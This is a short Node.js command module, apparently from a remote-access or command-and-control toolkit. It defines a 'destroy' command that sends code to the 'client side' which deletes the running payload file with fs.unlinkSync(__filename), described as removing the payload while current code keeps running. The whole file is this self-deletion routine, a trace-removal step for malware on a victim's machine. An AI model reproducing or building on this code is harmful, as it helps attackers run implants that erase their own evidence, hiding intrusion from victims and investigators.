module.exports = {
    name: 'destroy',
    usage: 'destroy',
    args: {},
    description: 'destroy payload on the client side (This keeps current code running)',
    run: async (methods, args) => {
        const { send, code } = methods
        send(0x02, code(`
        const fs = require('fs');
        fs.unlinkSync(__filename);
        `))
    }
}